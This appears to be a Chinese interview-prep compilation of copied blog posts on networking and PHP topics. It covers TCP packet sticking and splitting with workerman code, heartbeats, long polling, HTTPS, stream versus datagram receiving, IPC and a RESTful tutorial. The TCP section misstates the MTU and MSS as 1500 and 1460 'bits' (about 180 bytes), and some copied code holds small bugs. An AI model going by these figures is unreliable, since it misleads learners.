服务端一共读到两个数据包，第一个包包含客户端发出的第一条消息的完整信息，第二个包包含客户端发出的第二条消息，那这种情况比较好处理，服务器只需要简单的从网络缓冲区去读就好了，第一次读到第一条消息的完整信息，消费完再从网络缓冲区将第二条完整消息读出来消费。



没有发生粘包、拆包示意图

第二种情况：

服务端一共就读到一个数据包，这个数据包包含客户端发出的两条消息的完整信息，这个时候基于之前逻辑实现的服务端就蒙了，因为服务端不知道第一条消息从哪儿结束和第二条消息从哪儿开始，这种情况其实是发生了TCP粘包。



TCP粘包示意图

第三种情况：

服务端一共收到了两个数据包，第一个数据包只包含了第一条消息的一部分，第一条消息的后半部分和第二条消息都在第二个数据包中，或者是第一个数据包包含了第一条消息的完整信息和第二条消息的一部分信息，第二个数据包包含了第二条消息的剩下部分，这种情况其实是发送了TCP拆，因为发生了一条消息被拆分在两个包里面发送了，同样上面的服务器逻辑对于这种情况是不好处理的。



TCP拆包示意图

产生tcp粘包和拆包的原因

我们知道tcp是以流动的方式传输数据，传输的最小单位为一个报文段（segment）。tcp Header中有个Options标识位，常见的标识为mss(Maximum Segment Size)指的是，连接层每次传输的数据有个最大限制MTU(Maximum Transmission Unit)，一般是1500比特，超过这个量要分成多个报文段，mss则是这个最大限制减去TCP的header，光是要传输的数据的大小，一般为1460比特。换算成字节，也就是180多字节。

tcp为提高性能，发送端会将需要发送的数据发送到缓冲区，等待缓冲区满了之后，再将缓冲中的数据发送到接收方。同理，接收方也有缓冲区这样的机制，来接收数据。

发生TCP粘包、拆包主要是由于下面一些原因：

应用程序写入的数据大于套接字缓冲区大小，这将会发生拆包。

应用程序写入数据小于套接字缓冲区大小，网卡将应用多次写入的数据发送到网络上，这将会发生粘包。

进行mss（最大报文长度）大小的TCP分段，当TCP报文长度-TCP头部长度>mss的时候将发生拆包。

接收方法不及时读取套接字缓冲区数据，这将发生粘包。

……

如何解决拆包粘包

既然知道了tcp是无界的数据流，且协议本身无法避免粘包，拆包的发生，那我们只能在应用层数据协议上，加以控制。通常在制定传输数据时，可以使用如下方法：

使用带消息头的协议、消息头存储消息开始标识及消息长度信息，服务端获取消息头的时候解析出消息长度，然后向后读取该长度的内容。

设置定长消息，服务端每次读取既定长度的内容作为一条完整消息。

设置消息边界，服务端从网络流中按消息编辑分离出消息内容。

a)先基于第三种方法，假设区分数据边界的标识为换行符"\n"（注意请求数据本身内部不能包含换行符），数据格式为Json，例如下面是一个符合这个规则的请求包。

{"type":"message","content":"hello"}\n
注意上面的请求数据末尾有一个换行字符(在PHP中用双引号字符串"\n"表示)，代表一个请求的结束。

b)基于第一种方法，可以制定，首部固定10个字节长度用来保存整个数据包长度，位数不够补0的数据协议

0000000036{"type":"message","content":"hello"}
c)基于第一种方法，可以制定，首部4字节网络字节序unsigned int，标记整个包的长度

****{"type":"message","content":"hello all"}
其中首部四字节*号代表一个网络字节序的unsigned int数据，为不可见字符，紧接着是Json的数据格式的包体数据。

基于workerman的解决方案

制定了数据协议，那我们下面来通过代码具体分析一下，php中workerman,是如何解决上述问题的。为了便于理解，可以看下下面的流程图



 

workerman是基于策略模式来设计处理tcp粘包，拆包问题的。具体数据协议的制定在应用目录Applications/YourApp/Protocols目录下，实现则是在框架目录Workerman/Connection/TcpConnection.php中。这样的好处就是用户可以随意定制自己的数据协议格式，而框架代码都能处理。

我们现在Applications/YourApp/Protocols目录下，建一个jsonNL.php,来实现自己制定自己定义的数据协议。

JsonNL.php的实现

namespace Protocols;
class JsonNL
{
    /**
     * 检查包的完整性
     * 如果能够得到包长，则返回包的在buffer中的长度，否则返回0继续等待数据
     * 如果协议有问题，则可以返回false，当前客户端连接会因此断开
     * @param string $buffer
     * @return int
     */
    public static function input($buffer)
    {
        // 获得换行字符"\n"位置
        $pos = strpos($buffer, "\n");
        // 没有换行符，无法得知包长，返回0继续等待数据
        if($pos === false)
        {
            return 0;
        }
        // 有换行符，返回当前包长（包含换行符）
        return $pos+1;
    }
 
    /**
     * 打包，当向客户端发送数据的时候会自动调用
     * @param string $buffer
     * @return string
     */
    public static function encode($buffer)
    {
        // json序列化，并加上换行符作为请求结束的标记
        return json_encode($buffer)."\n";
    }
 
    /**
     * 解包，当接收到的数据字节数等于input返回的值（大于0的值）自动调用
     * 并传递给onMessage回调函数的$data参数
     * @param string $buffer
     * @return string
     */
    public static function decode($buffer)
    {
        // 去掉换行，还原成数组
        return json_decode(trim($buffer), true);
    }
}
再看下TcpConnection.php中，接收数据时，如何处理。

public function baseRead($socket, $check_eof = true)
    {
        $buffer = fread($socket, self::READ_BUFFER_SIZE);
 
        // Check connection closed.
        if ($buffer === '' || $buffer === false) {
            if ($check_eof && (feof($socket) || !is_resource($socket) || $buffer === false)) {
                $this->destroy();
                return;
            }
        } else {
            $this->_recvBuffer .= $buffer;
        }
 
        // If the application layer protocol has been set up.
        if ($this->protocol) {
            $parser = $this->protocol;
            while ($this->_recvBuffer !== '' && !$this->_isPaused) {
                // The current packet length is known.
                if ($this->_currentPackageLength) {
                    // Data is not enough for a package.
                    if ($this->_currentPackageLength > strlen($this->_recvBuffer)) {
                        break;
                    }
                } else {
                    // Get current package length.
                    $this->_currentPackageLength = $parser::input($this->_recvBuffer, $this);
                    // The packet length is unknown.
                    if ($this->_currentPackageLength === 0) {
                        break;
                    } elseif ($this->_currentPackageLength > 0 && $this->_currentPackageLength <= self::$maxPackageSize) {
                        // Data is not enough for a package.
                        if ($this->_currentPackageLength > strlen($this->_recvBuffer)) {
                            break;
                        }
                    } // Wrong package.
                    else {
                        echo 'error package. package_length=' . var_export($this->_currentPackageLength, true);
                        $this->destroy();
                        return;
                    }
                }
 
                // The data is enough for a packet.
                self::$statistics['total_request']++;
                // The current packet length is equal to the length of the buffer.
                if (strlen($this->_recvBuffer) === $this->_currentPackageLength) {
                    $one_request_buffer = $this->_recvBuffer;
                    $this->_recvBuffer  = '';
                } else {
                    // Get a full package from the buffer.
                    $one_request_buffer = substr($this->_recvBuffer, 0, $this->_currentPackageLength);
                    // Remove the current package from the receive buffer.
                    $this->_recvBuffer = substr($this->_recvBuffer, $this->_currentPackageLength);
                }
                // Reset the current packet length to 0.
                $this->_currentPackageLength = 0;
                if (!$this->onMessage) {
                    continue;
                }
                try {
                    // Decode request buffer before Emitting onMessage callback.
                    call_user_func($this->onMessage, $this, $parser::decode($one_request_buffer, $this));
                } catch (\Exception $e) {
                    Worker::log($e);
                    exit(250);
                } catch (\Error $e) {
                    Worker::log($e);
                    exit(250);
                }
            }
            return;
        }
 
        if ($this->_recvBuffer === '' || $this->_isPaused) {
            return;
        }
 
        // Applications protocol is not set.
        self::$statistics['total_request']++;
        if (!$this->onMessage) {
            $this->_recvBuffer = '';
            return;
        }
        try {
            call_user_func($this->onMessage, $this, $this->_recvBuffer);
        } catch (\Exception $e) {
            Worker::log($e);
            exit(250);
        } catch (\Error $e) {
            Worker::log($e);
            exit(250);
        }
        // Clean receive buffer.
        $this->_recvBuffer = '';
    }
上面的代码比较多，不需要细读，几个关键的地方可以看出处理的思路，先把接收的数据包追加到_recvBuffer变量中，然后调用用户自己定义的数据协议中的input方法。input方法则会判断数据中是否包含边界符，如果不包含则返回0，包含则返回当前数据包的大小。框架中接收到input的返回值后，如果接收值为0，则跳出循环不做处理，如果接收值不为0，则将截取的数据包赋值给one_request_buffer，并且重置_recvBuffer

// Get a full package from the buffer.
$one_request_buffer = substr($this->_recvBuffer, 0, $this->_currentPackageLength);
// Remove the current package from the receive buffer.
$this->_recvBuffer = substr($this->_recvBuffer, $this->_currentPackageLength);
 

最后：tcp虽然是个强大的协议，能保证数据的稳定性，一致性，但在实际开发中，我们还需要根据实际的数据协议，来控制每次获取的包是客户端发过来的一个完整的可以解析的包。
```

### 为什么需要心跳？
```
https://www.cnblogs.com/coderzh/p/WhyHeartBeatNeeded.html
几乎所有的网游服务端都有心跳包(HeartBeat或Ping)的设计，在最近开发手游服务端时，也用到了心跳包。思考思考，心跳包是必须的吗？为什么需要心跳包？TCP没有提供断线检测的方法吗？TCP提供的KeepAlive机制可以替代HeartBeat吗？

由于连接丢失时，TCP不会立即通知应用程序。比如说，客户端程序断线了，服务端的TCP连接不会检测到断线，而是一直处于连接状态。这就带来了很大的麻烦，明明客户端已经断了，服务端还维护着客户端的连接，照常执行着该玩家的游戏逻辑……

心跳包就是用来及时检测是否断线的一种机制，通过每间隔一定时间发送心跳数据，来检测对方是否连接。是属于应用程序协议的一部分。

问题1： TCP为什么不自己提供断线检测？

首先，断线检测需要轮询发送检测报文，会消耗一定的网络带宽和暂用一定的网络资源。如果把它做成TCP的底层默认功能，那些不需要断线检测的应用程序将会浪费不必要的带宽资源。

另外，TCP不提供连接丢失及时通知的最重要原因与其主要设计目的目标之一有关：出现网络故障时维护通信的能力。TCP是美国国防部赞助研究的，一种即使发生战争或自然灾害这种严重网络损坏情况下，也能维护可靠网络通信的网络协议。通常，网络故障只是暂时的，有时路由器会在TCP临时连接丢失后默默的重新连上。所以，TCP本身并不提供那么及时的断线检测。

问题2： TCP的KeepAlive机制可以用来及时检测连接状态吗？

TCP有个KeepAlive开关，打开后可以用来检测死连接。通常默认是2小时，可以自己设置。但是注意，这是TCP的全局设置。假如为了能更及时的检测出断开的连接，把tcp_keepalive_time和tcp_keepalive_intvl的时间改小（参考：Link），该机器上所有应用程序的KeepAlive检测间隔都会变小，显然是不能接受的。因为不同应用程序的需求是不一样的。

(在某些平台的Socket实现已经支持为每条连接单独设置KeepAlive参数)

KeepAlive本质上来说，是用来检测长时间不活跃的连接的。所以，不适合用来及时检测连接的状态。

问题3：心跳包（HeartBeat）为什么是好的方式及时检测连接状态？

具有更大的灵活性，可以自己控制检测的间隔，检测的方式等等。
心跳包同时适用于TCP和UDP，在切换TCP和UDP时，上层的心跳包功能都适用。（其实这种情况很少遇到）
有些情况下，心跳包可以附带一些其他信息，定时在服务端和客户端之间同步。（比如帧数同步）
结论
需要及时检测TCP连接状态，心跳包(HeartBeat)还是必须的。

转自我的独立博客：http://blog.coderzh.com/2015/03/05/WhyHeartBeatNeeded/
```

### 什么是长连接？
```
https://www.jb51.net/article/135006.htm
长连接技术(Long Polling)

在服务器端hold住一个连接, 不立即返回, 直到有数据才返回, 这就是长连接技术的原理

长连接技术的关键在于hold住一个HTTP请求, 直到有新数据时才响应请求, 然后客户端再次自动发起长连接请求.

那怎么样hold住一个请求呢？服务器端的代码可能看起来像这样的

1
2
3
4
5
6
7
8
set_time_limit(0); //这句很重要, 不至于运行超时
while (true) {
  if (hasNewMessage()) {
    echo json_encode(getNewMessage());
    break;
  }
  usleep(100000);   //避免太过频繁的查询
}
没错，就是通过循环来实现hold住一个请求， 不至于立即返回. 查询到有新数据之后才响应请求. 然后客户端处理数据后，再次发起长连接请求.

客户端的代码是像这样的

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
<script type="text/javascript">
  (function longPolling() {
    $.ajax({
      'url': 'server.php',
      'data': data,
      'dataType': 'json',
      'success': function(data) {
        processData(data);
        longPolling();
      },
      'error': function(data) {
        longPolling();
      }
    });
  })();
</script>
一个简易的聊天室

通过长连接, 我们可以开发一个简易的web聊天室

下面, 我们通过redis开发一个简易的web聊天室

1. 每一个客户端发起长连接时, 在服务器端生成一个消息队列, 对应该用户. 然后监听有无新数据, 有则返回数据到客户端进行处理, 并再起发起长连接请求.

2. 每一个客户端发起消息时, 进行消息队列的广播.

下面是代码片段:

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
<?php
namespace church\LongPolling;
use Closure;
use church\LongPolling\Queue\RedisQueue;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\JsonResponse;
class Server
{
  public $event = [];
  public $redisQueue = null;
  public $request = null;
  public $response = null;
  public function __construct()
  {
    $this->redisQueue = new RedisQueue();
    $this->request = Request::createFromGlobals();
    $this->response = new JsonResponse();
  }
  public function on($event, Closure $closure)
  {
    if (is_callable($closure)) {
      $this->event[$event][] = $closure;
    }
  }
  public function fire($event)
  {
    if (isset($this->event[$event])) {
      foreach ($this->event[$event] as $callback) {
        call_user_func($callback, $this);
      }
    }
  }
  public function sendMessage($data)
  {
    switch ($data['type']) {
      case 'unicast':   //单播
        $this->unicast($data['target'], $data['data'], $data['resource']);
        break;
      case 'multicast':    //组播
        foreach ($data['target'] as $target) {
          $this->unicast($target, $data['data'], $data['resource']);
        }
        break;
      case 'broadcast':    //广播
        foreach ($this->redisQueue->setQueueName('connections') as $target) {
          $this->unicast($target, $data['data'], $data['resource']);
        }
        break;
    }
    $this->fire('message');
  }
  public function unicast($target, $message, $resource = 'system')
  {
    $redis_queue = new RedisQueue();
    $redis_queue->setQueueName($target)->push($resource . ':' . $message);
  }
  public function getMessage($target)
  {
    return $this->redisQueue->setQueueName($target)->pop();
  }
  public function hasMessage($target)
  {
    return count($this->redisQueue->setQueueName($target));
  }
  public function run()
  {
    $data = $this->request->request;
    while (true) {
      if ($data->get('action') == 'getMessage') {
        if ($this->hasMessage($data->get('target'))) {
          $this->response->setData([
            'state' => 'ok',
            'message' => '获取成功',
            'data' => $this->getMessage($data->get('target'))
          ]);
          $this->response->send();
          break;
        }
      } elseif ($data->get('action') == 'connect') {
        $exist = false;
        foreach ($this->redisQueue->setQueueName('connections') as $connection) {
          if ($connection == $data->get('data')) {
            $exist = true;
          }
        }
        if (! $exist) {
          $this->redisQueue->setQueueName('connections')->push($data->get('data'));
        }
        $this->fire('connect');
        break;
      }
      usleep(100000);
    }
  }
}
长连接避免了过于频繁的轮询. 但服务器维持一个长连接也有额外的资源消耗. 大并发时性能不理想. 在小型应用里面可以考虑使用

更建议客户端使用html5的websocket协议, 服务器端使用swoole.

有关swoole, 你可以查看官网：https://www.swoole.com/
```

### HTTPS 是怎么保证安全的？
```
https://www.php.cn/safe/452112.html
本篇文章带大家了解一下HTTP存在的问题，介绍HTTPS是怎么保证安全的。有一定的参考价值，有需要的朋友可以参考一下，希望对大家有所帮助。


HTTP存在的问题

1、窃听风险：通信使用明文（不加密），内容可能会被窃听(第三方可能获知通信内容)

2、冒充风险：不验证通信方的身份，因此有可能遭遇伪装

3、篡改风险：无法证明报文的完整性，所以有可能已遭篡改

HTTPS



可以看到 HTTPS的网站，在浏览器的地址栏内会出现一个带锁的标记。

HTTPS并非是应用层一个新的协议，通常 HTTP 直接和 TCP 通信，HTTPS则先和安全层（SSL/TLS）通信，然后安全层再和 TCP 层通信。



SSL/TLS协议就是为了解决上面提到的HTTP存在的问题而生的，下面我们来看一下它是怎么解决的:

1、所有的信息都是加密传输的，第三方无法窃听

2、配备身份验证，防止身份被冒充

3、具有校验机制，一旦被篡改，通信双方会立刻发现

加密

对称加密

加密和解密同用一个秘钥的方式称为 共享秘钥加密，也被叫做对称秘钥加密。



浏览器发送给服务端 client_random 和一系列加密方法

服务端发送给浏览器 server_random和加密方法

现有浏览器和服务器有了三个相同的凭证：client_random、server_random和加密方法
用加密方法把 client_random、server_random 两个随机数混合起来，生成秘钥，这个密钥就是浏览器和服务端通信的暗号。

存在的问题：第三方可以在中间获取到client_random、server_random和加密方法，由于这个加密方法同时可以解密，所以中间人可以成功对暗号进行解密，拿到数据，很容易就将这种加密方式破解了。

非对称加密



浏览器发送给服务端 一系列加密方法

服务端发送给浏览器 加密方法以及公钥

之后浏览器通过公钥将数据加密传输给服务端，服务端收到数据使用私钥进行解密。服务端给浏览器发送数据，则使用私钥进行加密，浏览器收到服务端发送过来的数据，使用公钥进行解密。

存在的问题：

非对称加密效率太低， 这会严重影响加解密的速度，进而影响到用户打开页面的速度。

无法保证服务器发送给浏览器的数据安全， 服务器的数据只能用私钥进行加密(因为如果它用公钥那么浏览器也没法解密啦)，中间人一旦拿到公钥，那么就可以对服务端传来的数据进行解密了，就这样又被破解了。

HTTPS使用对称加密和非对称加密结合

传输数据阶段依然使用对称加密，但是对称加密的秘钥我们采用非对称加密传输。



浏览器向服务器发送client_random和加密方法列表。

服务器接收到，返回server_random、加密方法以及公钥。

浏览器接收，接着生成另一个随机数pre_master, 并且用公钥加密，传给服务器。(重点操作！)

服务器用私钥解密这个被加密后的pre_master。

到此为止，服务器和浏览器就有了相同的 client_random、server_random 和 pre_master, 然后服务器和浏览器会使用这三组随机数生成对称秘钥。有了对称秘钥之后，双方就可以使用对称加密的方式来传输数据了。

CA (数字证书)

使用对称和非对称混合的方式，实现了数据的加密传输。但是这种仍然存在一个问题，服务器可能是被黑客冒充的。这样，浏览器访问的就是黑客的服务器，黑客可以在自己的服务器上实现公钥和私钥，而对浏览器来说，它并不完全知道现在访问的是这个是黑客的站点。

服务器需要证明自己的身份，需要使用权威机构颁发的证书，这个权威机构就是 CA（Certificate Authority）， 颁发的证书就称为数字证书 (Digital Certificate)。

对于浏览器来说，数字证书有两个作用：

通过数字证书向浏览器证明服务器的身份

数字证书里面包含了服务器公钥

下面我们来看一下含有数字证书的HTTPS的请求流程



相对于不含数字证书的HTTPS请求流程，主要以下两点改动

服务器没有直接返回公钥给浏览器，而是返回了数字证书，而公钥正是包含数字证书中的；

在浏览器端多了一个证书验证的操作，验证了证书之后，才继续后序流程。
```

### 流与数据报的区别
```
https://phpor.net/blog/post/1223
（1）定义差别[1]
数据报是网络传输的数据的基本单元，包含一个报头和数据本身，其中报头描述了数据的目的地以及和其它数据之间的关系。同一报文的不同分组可以由不同的传输路径通过通信子网。UDP基于数据报。
字节流方式指的是仅把传输中的报文看作是一个字节序列，在字节流服务中，由于没有报文边界，用户进程在某一时刻可以读或写任意数量的字节。 TCP基于字节流。

（2）接收方式
TCP方式：

needbytes = RECVBUFSIZE-1;

while( bytesRecv <needbytes ) //取够进行处理，可以挂接到队列里
{     needbytes -= bytesRecv ;
        bytesRecv = recv( m_socket, buf, needbytes , 0 );
        if ( bytesRecv == 0 || bytesRecv == WSAECONNRESET )

     {//socket关闭了
            break;
       }

      buf+=bytesRecv; //偏移
}
1
2
3
4
5
6
7
8
9
10
11
12
13
needbytes = RECVBUFSIZE-1;
 
while( bytesRecv <needbytes ) //取够进行处理，可以挂接到队列里
{     needbytes -= bytesRecv ;
        bytesRecv = recv( m_socket, buf, needbytes , 0 );
        if ( bytesRecv == 0 || bytesRecv == WSAECONNRESET )
 
     {//socket关闭了
            break;
       }
 
      buf+=bytesRecv; //偏移
}
 

UDP方式：

while(bRun)
{
	iRes = recvfrom(m_socket,buf,RECVBUFSIZE-1,0,(struct sockaddr FAR *)&from,(int FAR *)&fromlength);
	if(iRes >=0)
	{
		break; //接收到了一个数据包，进行必要的处理，如果buffer大小小于数据报的长度，剩余丢弃
	}
}
1
2
3
4
5
6
7
8
while(bRun)
{
	iRes = recvfrom(m_socket,buf,RECVBUFSIZE-1,0,(struct sockaddr FAR *)&from,(int FAR *)&fromlength);
	if(iRes >=0)
	{
		break; //接收到了一个数据包，进行必要的处理，如果buffer大小小于数据报的长度，剩余丢弃
	}
}
注：If the datagram or message is larger than the buffer specified, the buffer is filled with the
first part of the datagram, and recv generates the error WSAEMSGSIZE. For unreliable protocols
(for example, UDP) the excess data is lost; for reliable protocols, the data is retained by the
service provider until it is successfully read by calling recv with a large enough buffer.

 

（3）处理大数据包或本地读出缓存小存在的问题
Posix系列的recv、recvfrom、read函数均无法得到数据包被截断的错误消息，只有recvmsg可以得到该消息。 ssize_t recvmsg(int socket, struct msghdr *message, int flags); 如果message->msg_flags & MSG_TRUNC为真，则表示数据包被截断。超出部分被丢弃。但也有例外，Solaris并不设置MSG_TRUNC，直接丢弃超出部分。 SVR4系统不丢弃超出部分，在后续的读操作中会获取超出部分。 Windows下的recv、recvfrom、WSARecv、WSARecvFrom会返回-1，并设置Last Error为WSAEMSGSIZE。另外，WSARecvEx函数则是专门用于这方面的一个函数。 int PASCAL FAR WSARecvEx(SOCKET s, char* buf, int len, int* flags); 当*flags & MSG_PARTIAL为真实，表示数据包被截断 Windows下所有超出的数据包都会被丢弃。

（4）疑问
recvfrom 与 recv均可以用在基于链接的或非链接的socket，两者就是接口不同吗？

这两个函数的区别仅仅在于，recvfrom会记录对方的socket地址，recvfrom有一个容易出错的地方，就是关于from地址的长度，在调用时这个长度必须是结构体struct sockaddr的长度，因为在recvfrom的实现中将会用到这个值。Recv/send中的flag如果是0，那么这两个函数等同于read/write. 需要注意的是，系统的socket缓冲区中并没有对收到的数据作字符串式的结尾处理，所以分析报文需要时需要用到recv/recvfrom返回的实际读取长度。

参考：
UDP数据包截断 http://www.javaeye.com/wiki/topic/248817
http://www.cppblog.com/wangfeng2500/articles/150758.html
```

### 进程间通信几种方式，最快的是哪种？
```
https://blog.csdn.net/rorntuck7/article/details/84565211
进程间通信 就是在不同进程之间传播或交换信息，那么不同进程之间存在着什么双方都可以访问的介质呢？进程的用户空间是互相独立的，一般而言是不能互相访问的，唯一的例外是共享内存区。但是，系统空间却是“公共场所”，所以内核显然可以提供这样的条件。除此以外，那就是双方都可以访问的外设了。在这个意义上，两个进程当然也可以通过磁盘上的普通文件交换信息，或者通过“注册表”或其它数据库中的某些表项和记录交换信息。广义上这也是进程间通信的手段，但是一般都不把这算作“进程间通信”。因为那些通信手段的效率太低了，而人们对进程间通信的要求是要有一定的实时性。

一．Linux下进程间通信的几种主要手段简介：

1.管道（Pipe）及有名管道（named pipe）：管道可用于具有亲缘关系进程间的通信，有名管道克服了管道没有名字的限制，因此，除具有管道所具有的功能外，它还允许无亲缘关系进程间的通信；

管道包括三种:1)普通管道PIPE, 通常有种限制,一是半双工,只能单向传输;二是只能在父子进程间使用. 2)流管道s_pipe: 去除了第一种限制,可以双向传输. 3)命名管道:name_pipe, 去除了第二种限制,可以在许多并不相关的进程之间进行通讯.

2.信号（Signal）：信号是比较复杂的通信方式，用于通知接受进程有某种事件发生，除了用于进程间通信外，进程还可以发送信号给进程本身；Linux除了支持Unix早期信号语义函数sigal外，还支持语义符合Posix.1标准的信号函数sigaction（实际上，该函数是基于BSD的，BSD为了实现可靠信号机制，又能够统一对外接口，用sigaction函数重新实现了signal函数）；

3.报文（Message）队列（消息队列）：消息队列是消息的链接表，包括Posix消息队列systemV消息队列。有足够权限的进程可以向队列中添加消息，被赋予读权限的进程则可以读走队列中的消息。消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺点。

4.共享内存：使得多个进程可以访问同一块内存空间，是最快的可用IPC形式。是针对其他通信机制运行效率较低而设计的。往往与其它通信机制，如信号量结合使用，来达到进程间的同步及互斥。

5.信号量（semaphore）：主要作为进程间以及同一进程不同线程之间的同步手段。

6.套接口（Socket）：更为一般的进程间通信机制，可用于不同机器之间的进程间通信。起初是由Unix系统的BSD分支开发出来的，但现在一般可以移植到其它类Unix系统上：Linux和System V的变种都支持套接字。

二．相关问题

FAQ1: 管道与文件描述符,文件指针的关系?

答: 其实管道的使用方法与文件类似,都能使用read,write,open等普通IO函数. 管道描述符类似于文件描述符. 事实上, 管道使用的描述符, 文件指针和文件描述符最终都会转化成系统中SOCKET描述符. 都受到系统内核中SOCKET描述符的限制. 本质上LINUX内核源码中管道是通过空文件来实现.

FAQ2: 管道的使用方法?

答: 主要有下面几种方法: 1)pipe, 创建一个管道,返回2个管道描述符.通常用于父子进程之间通讯. 2)popen, pclose: 这种方式只返回一个管道描述符,常用于通信另一方是stdin or stdout; 3)mkpipe: 命名管道, 在许多进程之间进行交互.

FAQ3: 管道与系统IPC之间的优劣比较?

答: 管道: 优点是所有的UNIX实现都支持, 并且在最后一个访问管道的进程终止后,管道就被完全删除;缺陷是管道只允许单向传输或者用于父子进程之间.

系统IPC: 优点是功能强大,能在毫不相关进程之间进行通讯; 缺陷是关键字KEY_T使用了内核标识,占用了内核资源,而且只能被显式删除,而且不能使用SOCKET的一些机制,例如select,epoll等.

FAQ4: WINDOS进程间通信与LINUX进程间通信的关系?

答: 事实上,WINDOS的进程通信大部分移植于UNIX, WINDOS的剪贴板,文件映射等都可从UNIX进程通信的共享存储中找到影子.

FAQ5: 进程间通信与线程间通信之间的关系?

答: 因为WINDOWS运行的实体是线程, 狭义上的进程间通信其实是指分属于不同进程的线程之间的通讯.而单个进程之间的线程同步问题可归并为一种特殊的进程通信.它要用到内核支持的系统调用来保持线程之间同步. 通常用到的一些线程同步方法包括:Event, Mutex, 信号量Semaphore, 临界区资源等.

转载自：http://blogold.chinaunix.net/u3/94667/showart_2263949.html
```

### `fork()` 会发生什么？
```
https://zhidao.baidu.com/question/268326157628607205.html
打开的文件描述符在父子进程之间是共享的 当父进程调用fork()创建子进程之后，文件指针在子进程中修改之后，父进程里也会相应地作出改动
```

## API 篇

### RESTful 是什么
```
https://www.runoob.com/php/php-restful.html
PHP RESTful
REST（英文：Representational State Transfer，简称REST) ，指的是一组架构约束条件和原则。

符合REST设计风格的Web API称为RESTful API。它从以下三个方面资源进行定义：

直观简短的资源地址：URI，比如：http://example.com/resources/。
传输的资源：Web服务接受与返回的互联网媒体类型，比如：JSON，XML，YAM等。
对资源的操作：Web服务在该资源上所支持的一系列请求方法（比如：POST，GET，PUT或DELETE）。
本教程我们将使用 PHP(不用框架) 来创建一个 RESTful web service，在文章末尾你可以下载本章节使用到的代码。

通过本教程你将学习到以下内容：

创建一个 RESTful Webservice。
使用原生 PHP, 不依赖任何框架。
URI 模式需要遵循 REST 规则。
RESTful service 接受与返回的格式可以是 JSON, XML等。
根据不同情况响应对应的 HTTP 状态码。
演示请求头的使用。
使用 REST 客户端来测试 RESTful web service。
RESTful Webservice 实例
以下代码是 RESTful 服务类 Site.php：

实例
<?php
/* 
 * 菜鸟教程 RESTful 演示实例
 * RESTful 服务类
 */
Class Site {
    
    private $sites = array(
        1 => 'TaoBao',  
        2 => 'Google',  
        3 => 'Runoob',              
        4 => 'Baidu',              
        5 => 'Weibo',  
        6 => 'Sina'
            
    );
        
    
    public function getAllSite(){
        return $this->sites;
    }
    
    public function getSite($id){
        
        $site = array($id => ($this->sites[$id]) ? $this->sites[$id] : $this->sites[1]);
        return $site;
    }    
}
?>
RESTful Services URI 映射
RESTful Services URI 应该设置为一个直观简短的资源地址。Apache 服务器的 .htaccess 应设置好对应的 Rewrite 规则。

本实例我们将使用两个 URI 规则：

1、获取所有站点列表：

http://localhost/restexample/site/list/
2、使用 id 获取指定的站点，以下 URI 为获取 id 为 3 的站点：

http://localhost/restexample/site/list/3/
项目的 .htaccess 文件配置规则如下所示：

# 开启 rewrite 功能
Options +FollowSymlinks
RewriteEngine on

# 重写规则
RewriteRule ^site/list/$   RestController.php?view=all [nc,qsa]
RewriteRule ^site/list/([0-9]+)/$   RestController.php?view=single&id=$1 [nc,qsa]
RESTful Web Service 控制器
在 .htaccess 文件中，我们通过设置参数 'view' 来获取 RestController.php 文件中对应的请求，通过获取 'view' 不同的参数来分发到不同的方法上。RestController.php 文件代码如下：

实例
<?php
require_once("SiteRestHandler.php");
        
$view = "";
if(isset($_GET["view"]))
    $view = $_GET["view"];
/*
 * RESTful service 控制器
 * URL 映射
*/
switch($view){
 
    case "all":
        // 处理 REST Url /site/list/
        $siteRestHandler = new SiteRestHandler();
        $siteRestHandler->getAllSites();
        break;
        
    case "single":
        // 处理 REST Url /site/show/<id>/
        $siteRestHandler = new SiteRestHandler();
        $siteRestHandler->getSite($_GET["id"]);
        break;
 
    case "" :
        //404 - not found;
        break;
}
?>
简单的 RESTful 基础类
以下提供了 RESTful 的一个基类，用于处理响应请求的 HTTP 状态码，SimpleRest.php 文件代码如下：

实例
<?php 
/*
 * 一个简单的 RESTful web services 基类
 * 我们可以基于这个类来扩展需求
*/
class SimpleRest {
    
    private $httpVersion = "HTTP/1.1";
 
    public function setHttpHeaders($contentType, $statusCode){
        
        $statusMessage = $this -> getHttpStatusMessage($statusCode);
        
        header($this->httpVersion. " ". $statusCode ." ". $statusMessage);        
        header("Content-Type:". $contentType);
    }
    
    public function getHttpStatusMessage($statusCode){
        $httpStatus = array(
            100 => 'Continue',  
            101 => 'Switching Protocols',  
            200 => 'OK',
            201 => 'Created',  
            202 => 'Accepted',  
            203 => 'Non-Authoritative Information',  
            204 => 'No Content',  
            205 => 'Reset Content',  
            206 => 'Partial Content',  
            300 => 'Multiple Choices',  
            301 => 'Moved Permanently',  
            302 => 'Found',  
            303 => 'See Other',  
            304 => 'Not Modified',  
            305 => 'Use Proxy',  
            306 => '(Unused)',  
            307 => 'Temporary Redirect',  
            400 => 'Bad Request',  
            401 => 'Unauthorized',  
            402 => 'Payment Required',  
            403 => 'Forbidden',  
            404 => 'Not Found',  
            405 => 'Method Not Allowed',  
            406 => 'Not Acceptable',  
            407 => 'Proxy Authentication Required',  
            408 => 'Request Timeout',  
            409 => 'Conflict',  
            410 => 'Gone',  
            411 => 'Length Required',  
            412 => 'Precondition Failed',  
            413 => 'Request Entity Too Large',  
            414 => 'Request-URI Too Long',  
            415 => 'Unsupported Media Type',  
            416 => 'Requested Range Not Satisfiable',  
            417 => 'Expectation Failed',  
            500 => 'Internal Server Error',  
            501 => 'Not Implemented',  
            502 => 'Bad Gateway',  
            503 => 'Service Unavailable',  
            504 => 'Gateway Timeout',  
            505 => 'HTTP Version Not Supported');
        return ($httpStatus[$statusCode]) ? $httpStatus[$statusCode] : $status[500];
    }
}
?>
RESTful Web Service 处理类
以下是一个 RESTful Web Service 处理类 SiteRestHandler.php，继承了上面我们提供的 RESTful 基类，类中通过判断请求的参数来决定返回的 HTTP 状态码及数据格式，实例中我们提供了三种数据格式： "application/json" 、 "application/xml" 或 "text/html"：

SiteRestHandler.php 文件代码如下:

实例
